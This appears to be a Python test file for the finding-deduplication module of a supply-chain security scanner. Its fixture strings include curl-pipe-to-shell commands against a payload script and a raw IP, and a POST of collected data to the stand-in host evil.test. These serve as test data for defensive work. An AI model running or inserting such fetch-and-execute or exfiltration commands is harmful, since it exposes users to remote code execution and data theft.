"""Cross-stage finding deduplication — the contract:

- a stronger finding (deterministic > empirical > measured > advisory)
  sharing a high-specificity token (URL / command / file) with a weaker
  ADVISORY or MEASURED finding subsumes it;
- deterministic/empirical findings are NEVER dropped;
- findings with no tokens are never dropped;
- order is preserved for survivors.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from fugu.dedupe import dedupe_findings, _tokens  # noqa: E402
from fugu.types import EvidenceSnippet, Finding  # noqa: E402


def _f(title, stage, confidence, ev_source="", excerpt="", owasp=("MCP04",)):
    ev = (
        [EvidenceSnippet(source=ev_source, excerpt=excerpt, meta={})]
        if ev_source
        else []
    )
    return Finding(
        owasp_ids=list(owasp), title=title, detail=f"detail about {excerpt or title}",
        severity="high", confidence=confidence, stage=stage, evidence=ev,
    )


# --- the real-world duplicate you hit in the UI ------------------------------
def test_the_readme_curlsh_duplicate_is_deduped():
    static = _f(
        "Remote install script fetched and executed in README.md", "static",
        "deterministic",
        ev_source="file:README.md:L24",
        excerpt="L12 curl https://rustwasm.github.io/wasm-pack/installer/init.sh -sSf | sh",
    )
    semantic = _f(
        "Fetch-and-run installation pattern for uv package manager", "semantic",
        "advisory",
        ev_source="semantic:Prerequisites > UV install command:L38",
        excerpt="UV (Python package manager), install with `curl -LsSf https://astral.sh/uv/install.sh | sh`",
    )
    # different URLs -> NOT subsumed (static caught wasm-pack, semantic uv)
    out = dedupe_findings([static, semantic])
    assert len(out) == 2, "different artifacts must both survive"


def test_same_url_static_subsumes_semantic():
    url = "https://raw.githubusercontent.com/acme/repo/main/payload.sh"
    static = _f(
        "Remote install script fetched and executed in README.md", "static",
        "deterministic",
        ev_source="file:README.md:L12",
        excerpt=f"L12 curl {url} | sh",
    )
    semantic = _f(
        "Supply-chain fetch-and-execute in install instructions", "semantic",
        "advisory",
        ev_source="semantic:Install section:L30",
        excerpt=f"install with `curl {url} | sh`",
    )
    out = dedupe_findings([static, semantic])
    assert len(out) == 1
    assert out[0].confidence == "deterministic"
    assert out[0].stage == "static"


def test_same_file_deterministic_findings_never_dropped():
    a = _f("Rule A hit", "static", "deterministic", ev_source="file:x.py:L1", excerpt="curl http://a")
    b = _f("Rule B hit", "static", "deterministic", ev_source="file:x.py:L2", excerpt="curl http://a")
    out = dedupe_findings([a, b])
    assert len(out) == 2, "two deterministic findings = two pieces of evidence"


def test_empirical_detonation_finding_survives_static_high():
    static = _f("curl to raw IP in install.sh", "static", "deterministic",
                ev_source="file:install.sh:L3", excerpt="curl http://93.184.216.34/x | sh")
    empirical = _f("Unexpected network egress during trigger execution", "detonation",
                   "empirical",
                   ev_source="mitm.flow[0]", excerpt="POST evil.test/collect")
    out = dedupe_findings([static, empirical])
    assert len(out) == 2, "empirical chamber observations always survive"


def test_no_tokens_never_dropped():
    weak = _f("Vague description smell", "semantic", "advisory")  # no evidence
    strong = _f("Something strong", "static", "deterministic")
    assert len(dedupe_findings([strong, weak])) == 2


def test_order_preserved():
    a = _f("A", "semantic", "advisory", ev_source="semantic:x:L1", excerpt="uses https://one.test/x")
    b = _f("B", "static", "deterministic", ev_source="file:f.md:L1", excerpt="curl https://one.test/x | sh")
    c = _f("C", "semantic", "advisory", ev_source="semantic:y:L2", excerpt="mentions https://two.test/y")
    out = dedupe_findings([a, b, c])
    # a comes BEFORE b (strong) -> a survives (subsumption is forward-only:
    # only findings weaker than an ALREADY-SEEN strong one drop)
    titles = [f.title for f in out]
    assert "A" in titles and "B" in titles and "C" in titles


def test_token_extraction_urls_commands_files():
    f = _f("t", "static", "deterministic",
           ev_source="file:BUILD.md:L12",
           excerpt="curl https://downloads.acme-corp.test/a/b?x=1 | sh; see ./scripts/go.py")
    toks = _tokens(f)
    assert any(t.startswith("url:downloads.acme-corp.test/a/b") for t in toks), toks
    assert any(t.startswith("cmd:curl https://downloads.acme-corp.test") for t in toks), toks
    # command tokens are trimmed at the pipe: no "; see ..." tail
    assert not any("; see" in t for t in toks), toks
    assert "file:build.md" in toks


def test_generic_hosts_are_not_url_tokens():
    f = _f("t", "static", "deterministic",
           ev_source="file:X.md:L1", excerpt="see https://example.com/page and https://github.com/y")
    toks = _tokens(f)
    assert not any(t.startswith("url:") for t in toks), toks
